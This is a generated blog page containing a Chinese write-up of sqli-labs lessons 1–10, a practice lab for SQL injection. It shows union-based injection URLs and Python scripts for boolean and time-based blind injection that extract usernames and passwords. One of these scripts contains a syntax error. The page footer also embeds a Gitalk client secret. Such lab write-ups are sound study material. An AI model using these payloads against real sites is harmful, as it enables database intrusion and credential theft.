@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+  <title>Sqli-labs - MINX&#39;s Blog</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/head.png" type="image/png">
+  <meta name="description" content="注入语句备忘 查库名：select schema_name from information_schema.schemata 查表名：select table_name from information_schema.tables where table_schema=&amp;#39;库名&amp;#39; 查列名：select column_name from information_schema.colum">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sqli-labs">
+<meta property="og:url" content="http://iminx.cn/2019/10/12/Sqli-labs/index.html">
+<meta property="og:site_name" content="MINX&#39;s Blog">
+<meta property="og:description" content="注入语句备忘 查库名：select schema_name from information_schema.schemata 查表名：select table_name from information_schema.tables where table_schema=&amp;#39;库名&amp;#39; 查列名：select column_name from information_schema.colum">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.png">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.1.png">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.2.png">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.3.png">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.4.png">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.5.png">
+<meta property="og:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.6.png">
+<meta property="og:updated_time" content="2019-10-13T03:00:16.531Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Sqli-labs">
+<meta name="twitter:description" content="注入语句备忘 查库名：select schema_name from information_schema.schemata 查表名：select table_name from information_schema.tables where table_schema=&amp;#39;库名&amp;#39; 查列名：select column_name from information_schema.colum">
+<meta name="twitter:image" content="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1570935665902">
+</head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div class="nexmoe-bg" style="background-image: url(https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/4.jpg)"></div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/">
+            <img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/head.png">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>6</div>
+        <div><span>标签</span>0</div>
+        <div><span>分类</span>4</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/clhclh1/clhclh1.github.io" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AWD/">AWD</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Bypass/">Bypass</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/SQL注入/">SQL注入</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/文件上传/">文件上传</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+  
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2019 MINX
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+
+<script>
+    const getRealPath = (pathname, desc = false) => {
+        if (!pathname) {
+            pathname = window.location.pathname
+        }
+        let names = pathname.split("/")
+        if (desc === false) {
+            for (let i = names.length - 1; i >= 0; --i) {
+                let name = names[i].trim()
+                if (name.length > 0 && name !== "/" && name !== "index.html") {
+                    return name
+                }
+            }
+        } else {
+            for (let i = 0; i < names.length; ++i) {
+                let name = names[i].trim()
+                if (name.length > 0 && name !== "/" && name !== "index.html") {
+                    return name
+                }
+            }
+        }
+        return "/"
+    }
+    let links = document.querySelectorAll('.nexmoe-list-item');
+    let rootRealPath = getRealPath(window.location.pathname, true);
+    for (let link of links) {
+        let linkPath = link.getAttribute("href");
+        if (linkPath && getRealPath(linkPath, true) === rootRealPath) {
+            link.className = "active nexmoe-list-item mdui-list-item mdui-ripple";
+        }
+    }
+</script>
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-tab">
+            <a mdui-drawer="{target: '#drawer', swipe: true}">
+              <i class="mdui-icon material-icons">menu</i>
+            </a>
+          </div>
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+        <img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/3.jpg">
+        
+        <h1>Sqli-labs</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年10月12日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1,045 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 5 分钟</a>
+    
+      <a class="nexmoefont icon-appstore-fill -link" href="/categories/SQL注入/">SQL注入</a>
+    
+    
+  </div>
+  <article>
+    <h1 id="注入语句备忘"><a href="#注入语句备忘" class="headerlink" title="注入语句备忘"></a>注入语句备忘</h1><ol>
+<li>查库名：<code>select schema_name from information_schema.schemata</code></li>
+<li>查表名：<code>select table_name from information_schema.tables where table_schema=&#39;库名&#39;</code></li>
+<li>查列名：<code>select column_name from information_schema.columns where table_name=&#39;表名&#39;</code></li>
+<li>查数据：<code>select 列名 from 库名.表名</code><a id="more"></a>
+<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1></li>
+<li>可将用引号包含的库名，表名转换为十六进制，避免引号被过滤</li>
+<li>数据过多时可以利用limit限制数据数量</li>
+<li>同上也可以用<code>concat</code>链接多个数据成为一条返回结果</li>
+<li>。。。。</li>
+</ol>
+<h1 id="sqli-labs测试"><a href="#sqli-labs测试" class="headerlink" title="sqli-labs测试"></a>sqli-labs测试</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><ol>
+<li>构造<code>127.0.0.1/Less-1/?id=1</code>成功返回数据</li>
+<li>构造<code>127.0.0.1/Less-1/?id=1&#39;</code>出现报错说明存在注入点</li>
+<li>构造<code>127.0.0.1/Less-1/?id=1&#39; order by 3--+</code>测试有几列</li>
+<li>构造<code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,3--+</code>查看回显点//此时需要令查询的id不存在<br><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.png" alt="sql"></li>
+<li>构造<code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select schema_name from information_schema.schemata)--+</code>查询数据库名。发现报错说数据过多，此时就可以利用limit构造：<code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select schema_name from information_schema.schemata limit 0,1)--+</code>依次进行查看。<br><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.1.png" alt="sql"><br>或者可以利用<code>group_concat</code>构造：<code>?id=-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+</code><br><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.2.png" alt="sql"></li>
+<li>构造：<code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)--+</code>查询表名<br>此时‘security’可以用十六进制替换，或者用database()<br><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.3.png" alt="sql"></li>
+<li>构造：<code>127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)--+</code>查询段名<br><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.4.png" alt="sql"></li>
+<li>构造：<code>?id=-1&#39; union select 1,2,(select concat_ws(0x7e,username,password) from security.users limit 0,1)--+</code>查询数据<br><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.5.png" alt="sql"><br>也可以构造：<code>?id=-1&#39; union select 1,2,(select group_concat(username,0x7e,password) from security.users)--+</code>查询数据<br><img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%86%85%E5%AE%B9/sql1.6.png" alt="sql"></li>
+</ol>
+<p>至此，sqli-labs的第一关就算是结束了</p>
+<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>这一关总体和第一关是一样的，只是这里是整型注入，因此不用单引号去闭合，其余操作和第一关相同</p>
+<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>这一关是利用<code>&#39;)</code>来闭合</p>
+<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>这一关是利用<code>&quot;)</code>来闭合</p>
+<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>这关开始就是盲注了，并且通过判断可以得知这是布尔盲注<br>直接丢出脚本：</p>
+<pre><code>import requests
+import time
+
+url = &quot;http://47.96.233.216:8080/Less-5/?id=1&#39;&quot;
+
+test = &quot;select database()&quot;
+
+schema = &quot;select schema_name from information_schema.schemata limit 0,1&quot;
+
+table = &quot;select table_name from information_schema.tables where table_schema=database() limit 1,1&quot;
+
+column = &quot;select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1&quot;
+
+data = &quot;select concat_ws(0x5e,username,password) from security.users limit 0,1&quot;
+
+result = &quot;&quot;
+
+for i in range(1,10):
+    for j in range(48,122):
+        payload = url + &quot; and ascii(substr(({}),{},1))={}--+&quot;.format(data,i,j)
+        # print(payload)
+        r = requests.get(payload)
+        l = len(r.text)
+        # print(l)
+        if(l==704):
+            result+=chr(j)
+            print(result)
+            break
+</code></pre><p>这个脚本还是比较偏向手动化的。。。。</p>
+<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>用<code>&quot;</code>闭合</p>
+<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>用<code>&#39;))</code>闭合，但是此时的设定是无论是否正确，返回的数据长度是一样的。此时改变判断方式：</p>
+<pre><code>import requests
+import time
+
+url = &quot;http://47.96.233.216:8080/Less-7/?id=1&#39;))&quot;
+
+test = &quot;select database()&quot;
+
+schema = &quot;select schema_name from information_schema.schemata limit 0,1&quot;
+
+table = &quot;select table_name from information_schema.tables where table_schema=database() limit 1,1&quot;
+
+column = &quot;select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1&quot;
+
+data = &quot;select concat_ws(0x5e,username,password) from security.users limit 0,1&quot;
+
+result = &quot;&quot;
+
+for i in range(1,10):
+    for j in range(48,122):
+        payload = url + &quot; and ascii(substr(({}),{},1))={}--+&quot;.format(test,i,j)
+        r = requests.get(payload)
+        txt = r.text
+        l = len(r.text)
+        s = &quot;You are in.... Use outfile......&quot;
+        if(s in txt):
+            result+=chr(j)
+            print(result)
+            break
+</code></pre><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>这一关的闭合方式还是单引号，而且好像和第五关没啥差别？？？只要改一下返回数据长度脚本一样是可以用的？？</p>
+<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>通过测试我们可以发现无论所查询的数据是否存在，都会返回”You are in….“，可以推断这次不是布尔盲注而是时间盲注。丢出时间盲注的脚本：</p>
+<pre><code>import requests
+import time
+
+url = &quot;http://47.96.233.216:8080/Less-9/?id=1&#39;&quot;
+
+test = &quot;select database()&quot;
+
+schema = &quot;select schema_name from information_schema.schemata limit 0,1&quot;
+
+table = &quot;select table_name from information_schema.tables where table_schema=database() limit 0,1&quot;
+
+column = &quot;select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1&quot;
+
+data = &quot;select concat_ws(0x5e,username,password) from security.users limit 0,1&quot;
+
+result = &quot;&quot;
+
+for i in range(1,10):
+    for j in range(48,122):(test,i,j)
+        payload = url + &quot; and if(ascii(substr(({}),{},1))={},sleep(2),1)--+&quot;.format(data,i,j)
+        t1 = time.time()
+        r = requests.get(payload)
+        t2 = time.time()
+        if(t2-t1&gt;=2):
+            result+=chr(j)
+            print(result)
+            break
+</code></pre><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>用<code>&quot;</code>闭合</p>
+<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2>
+  </article>
+  
+    
+<div class="nexmoe-post-copyright">
+<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+<strong>本文作者：</strong>MINX<br>
+<strong>本文链接：</strong><a href="http://iminx.cn/2019/10/12/Sqli-labs/" title="http://iminx.cn/2019/10/12/Sqli-labs/" target="_blank" rel="noopener">http://iminx.cn/2019/10/12/Sqli-labs/</a><br>
+
+  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可 <br> <a href="http://www.miitbeian.gov.cn/">闽ICP备19007766号</a>
+
+</div>
+
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1570935665893"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+  
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
